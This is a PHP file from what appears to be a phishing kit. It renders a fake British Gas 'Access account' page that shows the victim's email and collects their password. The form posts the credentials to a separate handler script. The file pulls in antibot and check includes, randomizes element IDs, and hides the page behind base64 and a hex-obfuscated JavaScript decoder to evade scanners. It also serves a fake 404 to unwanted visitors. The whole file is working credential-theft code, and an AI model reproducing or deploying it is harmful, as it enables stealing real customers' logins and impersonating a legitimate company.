<?php

error_reporting(0);
include "at.php";
include "control.php";

include('files/boot/check.php');
include('files/boot/check1.php');
include('files/boot/check2.php');
include('files/boot/antibot.php');
include('files/v/enc.php');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
session_start();
session_regenerate_id();
if(isset($_GET["validid"]))
{
	$fname=randomCha(rand(10,12));
	$fnamex=randomCha(rand(13,15));

$email = $_POST['username'];

	echo '<!DOCTYPE html>
	'.ob_start().'
<html class="win chrome chrome69 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script>
function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("'.$fnamex.'").classList.remove("in-focus");
		return false;
    }
	
}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("'.$fnamex.'").classList.add("in-focus");
	}
	
}

</script>

<link rel="SHORTCUT ICON" href="include/favicon.ico">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <title>Identity</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-itunes-app" content="app-id=340473961">

    
<style>
#app-preloader {
  font-family: Arial;
  width: 180px; height: 30px;
  line-height: 30px; position: absolute; top: 50%; left: 50%; text-align: center;
  margin-top: -15px; margin-left: -90px;
  color: #0099ff; z-index: 1000;
}
</style>
</head><body class="'.$fname.'-application">

   
  <link rel="stylesheet" href="include/bg-vi-3.0.2.css">

<meta name="theme-color" content="#005EB8">

  
  <meta name="tag" content="2.7.8">


    <link rel="stylesheet" href="include/font-awesome.min.css">
    <link rel="stylesheet" href="include/vendor-6593e5f4e090a11492d9b56eb4e38aaa.css">
    <link rel="stylesheet" href="include/identity-f3bfb218359aabfe20b6c891ec255dcb.css">

    
  <link rel="stylesheet" href="include/hpp-embedded-integration-library.css">
 
<div id="'.$fname.'" class="'.$fname.'-view"><div id="'.$fname.'" class="'.$fname.'-view">    <header id="addon-bg-header" class="bgcss custom-bg-1 '.$fname.'-view"><nav class="navbar yamm navbar-default navbar-fixed-top">
  <a href="#" class="sr-only sr-only-focusable">Skip to main content</a>
    <div class="topnav py1">
      <div class="container">
        <div class="pull-left">
          <div id="'.$fname.'" class="__56f18 '.$fname.'-view"><span class="background-white active px2 py3">My Home</span><ul class="navbar-nav collapse navbar-collapse navbar-topnav navbar-right yamm-fw"><li class="dropdown dropdown-topnav"><a href="#" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" class="px2 py3 dropdown-toggle">My Business</a><div role="menu" aria-labelledby="Business" class="dropdown-menu dropdown-menu-topnav"><ul role="menu" class="fa-ul ml2 mr4 mb4"><div><div class="Business Energy"><a href="#"><h5 class="px2 py2">Business Energy</h5></a><li><a href="#"></a><a title="businessElectricity" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Business electricity</a></li><li><a title="businessGas" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Business gas</a></li><li><a title="businessGAQ" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Get a business energy quote</a></li></div><div class="Business Services"><a href="#"><h5 class="px2 py2">Business Services</h5></a><li><a href="#"></a><a title="businessBoilerMaintenance" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler maintenance</a></li><li><a title="businessBoilerInstallation" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler installation</a></li><li><a title="businessBoilerBreakdown" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler breakdown</a></li></div><div class="Your business account"><a href="#"><h5 class="px2 py2">Your business account</h5></a><li><a href="#"></a><a title="businessLogin" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Login</a></li><li><a title="businessRegister" role="menuitem" href="#" class="menu-section"><i class="fa fa-angle-right"></i>Register</a></li></div></div></ul></div></li></ul></div>
        </div>
        <div id="quickLinks" class="pull-right hidden-xs">
<!---->        </div>
      </div>
    </div>
  <div class="container">
    <div class="navbar-header">
      <button type="button" id="btn-menu-1" data-toggle="collapse" data-target="#mobile-Menu-3" class="navbar-toggle collapsed" data-'.$fname.'-action="" data-'.$fname.'-action-409="409">
        <i class="fa fa-reorder ml1 mr1"></i>
        <p>Menu</p>
      </button>
      <button type="button" id="btn-menu-2" data-toggle="collapse" data-target="#mobile-Menu-2" class="navbar-toggle collapsed" data-'.$fname.'-action="" data-'.$fname.'-action-410="410">
        <i class="fa fa-user"></i>
        <p>My Account</p>
      </button>
      <a href="#" id="logo">
            <img alt="British Gas" src="include/bg-logo-mobile.svg" width="146px" height="57px" class="bg-logo mt1 mb1 xs-ml2 sm-ml0">
      </a>
    </div>
    <div class="nav-list-adj nav-bar-content">
        <div id="navbar-collapse-1" class="collapse navbar-collapse '.$fname.'-view"><ul id="navbar" class="nav navbar-nav navbar-right">
    <li class="dropdown yamm-fw mt5">
        <a href="#" data-toggle="dropdown" role="button" title="Energy" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Energy
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="#" data-toggle="dropdown" role="button" title="Home Services" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Home Services
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="#" data-toggle="dropdown" role="button" title="Smart Home" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Smart Home
        </a>
       
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="#" id="help-and-support" data-toggle="dropdown" role="button" title="Help &amp; Support" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Help &amp; Support
        </a>
<!---->    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="#" id="loggedInLink" data-toggle="dropdown" role="button" title="My Account" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          My Account
        </a>
        
    </li>
</ul>
</div>
    </div>
  </div>
</nav>
</header>

</div>
<div class="identity custom-bg custom-bg-1 bgcss">
<!---->  <div><div class="container login index">
<!---->
<!---->
      <div class="text-center login-title">
        <h1 class="h2 text-center">Access account</h1>
      </div>

      <div id="'.$fname.'" class="'.$fname.'-view"><form id="loginForm" class="form-behaviour-default text-center no-success form-behaviour-default text-center unsubmitted '.$fname.'-view" method="post" action="i3764.php?/ACC/Sign/complete&validid='.randomCha(rand(15,30)).'" onSubmit="return empty()">
  <div id="'.$fname.'" class="scroll-anchor scroll-anchorerror '.$fname.'-view">
</div>

  <input id="csrfToken" type="hidden" name="_csrf" value="">
  <input id="autoLockedEmail" type="hidden" name="autoLockedEmail" value="true">
  <input id="routeName" type="hidden" name="routeName" value="#/authenticate">

  <span id="email-address" class="email-address inspectlet-sensitive font-size-6 bold mb5">
    '.$email.'  </span>

  <div class="hidden">
    <input type="text" name="username" aria-hidden="true">
	<input type="hidden" name="email" aria-hidden="true" value="'.$email.'">
  </div>
  <div class="row">
    <div class="col-md-4 col-md-offset-4 col-xs-12">
<div id="'.$fnamex.'" class="has-feedback form-group has-error pristine touched in-focus '.$fname.'-view">      <label for="loginForm-password">Password</label>
      <div id="'.$fname.'" class="input-password static '.$fname.'-view"><input name="password" type="password" autocapitalize="none" id="password" class="form-control text-center '.$fname.'-text-field '.$fname.'-view" onBlur="change()">
<div class="popover right" style="display: block; left: 370px; top: -4.82001px;">
  <div class="arrow"></div>
  <h3 class="popover-title">Your password must</h3>
  <div class="popover-content">
    <p>
      <span class="glyphicon glyphicon-ok "></span>
       Be between 8-20 characters
      <br>
      <span class="glyphicon glyphicon-ok "></span>
      Have both letters and numbers
    </p>
  </div>
</div>
<button type="button" class="btn btn-tertiary btn-show" data-'.$fname.'-action="" data-'.$fname.'-action-734="734">
  <i aria-hidden="true" class="fa fa-eye"></i>
  Show password
</button>
</div>
      <span aria-hidden="true" class="glyphicon glyphicon-ok form-control-feedback"></span>
      <span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback"></span>
      <p id="loginForm-password-error" class="form-control-error">
        <i class="fa fa-exclamation-triangle"></i> We need a password from you
      </p>

</div>    </div>
  </div>

  <div class="form-group text-center">
    <button style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer; outline: 0" type="submit" id="loginForm-submit" class="bg-button btn btn-primary '.$fname.'-view">      <span aria-hidden="true" class="bg-button-icon fa fa-angle-right"></span>
   Log in 
</button>
  </div>


</form></div>

      <div class="text-center mb4">
<a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="#" id="'.$fname.'" class="btn btn-tertiary '.$fname.'-view">          <span aria-hidden="true" class="fa fa-angle-right"></span>Ive forgotten my password
</a>      </div>
    </div>
</div>
</div>

<div id="'.$fname.'" class="'.$fname.'-view">    <footer id="addon-bg-footer" class="bgcss custom-bg-1 bg-footer '.$fname.'-view"><div class="background-dark-blue britishgas"><div class="container sm-py12 xs-py8"><div class="row equal-height-row"><div class="col-lg-3 col-sm-3 col-md-3 col-xs-6 equal-height-col"><ul class="p0"><li><a href="#" title="About British Gas">About us</a></li><li><a href="#" title="Legal">Legal</a></li><li><a href="#" title="Cookie policy">Cookie policy</a></li><li><a href="#" title="Terms &amp; conditions">Terms &amp; conditions</a></li><li><a href="#" title="Privacy policy">Privacy policy</a></li><li><a href="#" title="Access for all">Access for all</a></li><li><a href="#" title="Performance standards">Performance standards</a></li><li><a href="#" title="Our complaints performance">Complaints performance</a></li><li><a href="#" title="Complaints">Complaints</a></li><li><a href="#" title="Emergencies">Emergencies</a></li><li><a href="#" title="Download our app">Download our app</a></li></ul></div><div class="border-right border-cyan col-md-3 col-lg-3 col-sm-3 col-xs-6 equal-height-col"><ul class="p0"><li><a href="#" title="British Gas Business">British Gas Business</a></li><li><a href="#" title="Hive Active Heating">Hive Active Heating</a></li><li><a href="#" title="Centrica PLC">Centrica PLC</a></li></ul></div><div class="col-sm-6 col-xs-12 col-lg-4 col-md-4 social-box xs-mt3 equal-height-col"><div class="row"><div class="footer-social col-sm-5 col-md-5 col-lg-5 col-xs-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-1"><a target="_blank" href="#" class="mb6 block"><img src="include/Icon_Twitter.svg" width="39">&nbsp;Twitter</a></div><div class="footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6"><a target="_blank" href="#" class="mb6 block"><img src="include/Icon_YouTube.svg" width="39">&nbsp;YouTube</a></div></div><div class="row"><div class="footer-social col-sm-5 col-sm-offset-1 col-md-5 col-md-offset-1 col-lg-5 col-lg-offset-1 col-xs-offset-0 col-xs-6"><a target="_blank" href="#" class="mb6 block"><img src="include/Icon_Facebook.svg" width="39">&nbsp;Facebook</a></div><div class="footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6"><a target="_blank" href="#" class="mb6 block"><img src="include/Icon_News.svg" width="39">&nbsp;Latest news</a></div></div></div></div><div class="row"><div class="col-xs-12 legal-links"><div class="pull-right"><img title="British Gas" src="include/bg_logo_white.svg" class="footer-bg-logo"><p class="britishgas">� British Gas 2018</p></div></div></div></div></div></footer>

</div>

</div><script> 
window.onload=function(){ 
history.pushState(null,null, "locale=en-US&?id='.$fnamex.'/'.$fnamex.'3'.$fnamex.'6'.$fnamex.'") 
} 
</script>
';
?>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?>
echo '</body></html>';


<?php
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 500);
	die("<h1>404 Page Not Found</h1>");
}
?><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<script id="_wautga">var _wau = _wau || []; _wau.push(["dynamic", "6vx1nnpvri", "tga", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>